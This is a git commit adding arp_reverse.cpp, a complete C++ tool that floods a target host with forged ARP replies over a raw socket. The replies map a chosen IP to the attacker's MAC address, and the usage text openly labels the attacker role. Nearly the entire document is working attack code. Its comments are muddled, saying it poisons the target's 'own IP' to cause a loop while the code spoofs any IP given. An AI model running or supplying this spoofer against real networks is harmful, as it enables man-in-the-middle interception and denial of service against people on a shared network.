33ab67909292c3278834095bb15b9e6efbbc4c50
zoned out <126989297+phntmzn@users.noreply.github.com>
2026-09-14 10:42:43 -0500

    Create arp_reverse.cpp

---
+++ arp_reverse.cpp
@@ -0,0 +1,104 @@
+// Compile: g++ -o arp_reverse arp_reverse.cpp
+// Run: sudo ./arp_reverse <target_ip> <target_mac> <spoof_ip> <attacker_mac> <iface>
+// Requires: root privileges
+
+#include <iostream>
+#include <cstring>
+#include <cstdlib>
+#include <cstdio>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <net/if.h>
+#include <netinet/in.h>
+#include <netinet/if_ether.h>
+#include <linux/if_packet.h>
+#include <arpa/inet.h>
+
+class ARPReversePoison {
+private:
+    int sock;
+    std::string iface;
+    
+    void macToBytes(const std::string& mac, uint8_t* out) {
+        sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+               &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]);
+    }
+    
+public:
+    ARPReversePoison(const std::string& i) : iface(i) {
+        sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
+        
+        struct sockaddr_ll sll;
+        memset(&sll, 0, sizeof(sll));
+        sll.sll_family = AF_PACKET;
+        sll.sll_ifindex = if_nametoindex(iface.c_str());
+        sll.sll_protocol = htons(ETH_P_ARP);
+        bind(sock, (struct sockaddr*)&sll, sizeof(sll));
+    }
+    
+    // Send ARP reply to the TARGET using SPOOFED SOURCE IP
+    // but with our MAC as the sender hardware address
+    // Different from typical: we tell the target that "the target's own IP"
+    // is at our MAC - this poisons target's view of itself
+    void sendReversePoison(const std::string& spoofedSrcIP,
+                           const std::string& attackerMAC,
+                           const std::string& targetIP,
+                           const std::string& targetMAC) {
+        uint8_t packet[42];
+        memset(packet, 0, sizeof(packet));
+        
+        struct ether_header* eth = (struct ether_header*)packet;
+        struct ether_arp* arp = (struct ether_arp*)(packet + 14);
+        
+        macToBytes(targetMAC, eth->ether_dhost);
+        macToBytes(attackerMAC, eth->ether_shost);
+        eth->ether_type = htons(ETH_P_ARP);
+        
+        arp->arp_hrd = htons(ARPHRD_ETHER);
+        arp->arp_pro = htons(ETH_P_IP);
+        arp->arp_hln = 6;
+        arp->arp_pln = 4;
+        arp->arp_op = htons(ARPOP_REPLY);
+        
+        macToBytes(attackerMAC, arp->arp_sha);
+        inet_pton(AF_INET, spoofedSrcIP.c_str(), arp->arp_spa);
+        macToBytes(targetMAC, arp->arp_tha);
+        inet_pton(AF_INET, targetIP.c_str(), arp->arp_tpa);
+        
+        struct sockaddr_ll sll;
+        memset(&sll, 0, sizeof(sll));
+        sll.sll_family = AF_PACKET;
+        sll.sll_ifindex = if_nametoindex(iface.c_str());
+        sll.sll_halen = 6;
+        memcpy(sll.sll_addr, eth->ether_dhost, 6);
+        
+        sendto(sock, packet, 42, 0, (struct sockaddr*)&sll, sizeof(sll));
+    }
+    
+    // Reverse poison: tell target that its OWN IP is at attacker MAC
+    // Causes target to route its own traffic to attacker - traffic loop
+    void run(const std::string& targetIP, const std::string& targetMAC,
+             const std::string& spoofIP, const std::string& attackerMAC) {
+        std::cout << "[*] Reverse ARP poisoning\n";
+        std::cout << "[*] Will tell target: " << spoofIP 
+                  << " is at attacker MAC\n";
+        
+        while (true) {
+            sendReversePoison(spoofIP, attackerMAC, targetIP, targetMAC);
+            usleep(500000);
+        }
+    }
+    
+    ~ARPReversePoison() { close(sock); }
+};
+
+int main(int argc, char* argv[]) {
+    if (argc != 6) {
+        std::cerr << "Usage: " << argv[0] 
+                  << " <target_ip> <target_mac> <spoof_ip> <attacker_mac> <iface>\n";
+        return 1;
+    }
+    ARPReversePoison poison(argv[5]);
+    poison.run(argv[1], argv[2], argv[3], argv[4]);
+    return 0;
+}
